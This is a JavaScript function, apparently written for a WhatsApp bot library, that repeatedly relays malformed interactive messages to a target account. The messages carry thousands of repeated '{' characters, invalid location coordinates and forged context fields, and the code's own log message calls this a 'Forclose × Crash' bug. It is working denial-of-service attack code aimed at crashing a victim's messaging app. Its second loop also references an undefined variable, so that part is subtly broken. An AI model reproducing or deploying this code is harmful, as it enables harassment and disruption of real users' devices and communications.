async function VerloadHardCore(target) {
const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  for (let j = 0; j < 15; j++) {
    const msg = await generateWAMessageFromContent(target, {
      ephemeralMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 2,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveMessage: {
            header: {
              title: "🩸⃟༑⌁⃰VaxzyIsHere.js",
              hasMediaAttachment: false,
              audioMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
                mimetype: "audio/mpeg",
                directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1750124469",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
                contextInfo: {
                  mentionedJid: [target],
                  participant: target,
                  remoteJid: target,
                  expiration: 9741,
                  ephemeralSettingTimestamp: 9741,
                  disappearingMode: {
                    initiator: "INITIATED_BY_OTHER",
                    trigger: "ACCOUNT_SETTING"
                  }
                },
                scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
                scanLengths: [1000, 2000, 3000, 4000],
                midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
              }
            },
            body: {
              text: "🩸⃟༑⌁⃰VaxzyIsHere.js"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(1000)
            }
          }
        }
      }
    }, {});

    await Vxzy.relayMessage(target, msg.message, {
      participant: { jid: target },
      additionalNodes: Node,
      messageId: msg.key.id
    });
  }
 
  for (let j = 0; j < 15; j++) {  
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸⃟༑⌁⃰VaxzyIsHere.js",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "🩸⃟༑⌁⃰VaxzyIsHere.js",
                address: "vxz.json",
              },
            },
            body: {
              text: "🩸⃟༑⌁⃰VaxzyIsHere.js",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await Vxzy.relayMessage(target, msg. message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}  
  
  console.log("Sending Bug Forclose × Crash To Target🐉");
}